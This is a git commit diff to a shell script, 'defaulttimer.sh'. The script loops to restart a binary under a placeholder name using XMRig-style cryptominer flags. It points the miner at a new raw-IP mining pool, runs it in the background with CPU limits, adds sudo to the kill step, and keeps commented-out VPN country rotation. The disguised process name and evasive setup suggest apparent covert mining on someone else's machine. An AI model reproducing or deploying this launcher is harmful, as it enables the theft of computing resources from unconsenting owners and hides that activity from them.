0204e1d5440ede24ec501f87e1acafa7a2def13b
servicemi <52180716+servicemi@users.noreply.github.com>
2019-11-12 20:27:20 -0300

    Update defaulttimer.sh

--- defaulttimer.sh
+++ defaulttimer.sh
@@ -7,9 +7,9 @@ do
  TIM=$( shuf -i 180-298 -n 1 )
  cont_v=$(shuf -e US-C US US-M CA AT HR CY CZ DK FI FR GR HU IL IT MD NO PL GB ZA AU TR AU ID SG KR AR MX -n 1)
  
- pkill defaultsoftwarename
+ sudo pkill defaultsoftwarename
  #windscribe connect $cont_v
- defaultsoftwarename -o 94.103.81.233:34311 --rig-id=$ID -B -l /tmp/$tmpfoldername/log.log --donate-level=0 --print-time=40 --threads=defaultTHREADS --cpu-priority=4 --background --max-cpu-usage=$CPU --av=1 --variant -1
+ defaultsoftwarename -o 91.245.225.43:3645 --rig-id=$ID -B -l /tmp/$tmpfoldername/log.log --donate-level=1 --print-time=40 --threads=defaultTHREADS --cpu-priority=4 --background --max-cpu-usage=$CPU --av=1 --variant -1
  echo -e 'ALL WORKS! tail -f /tmp/$tmpfoldername/log.log' $CPU $TIM
  sleep $TIM;
  #windscribe disconnect
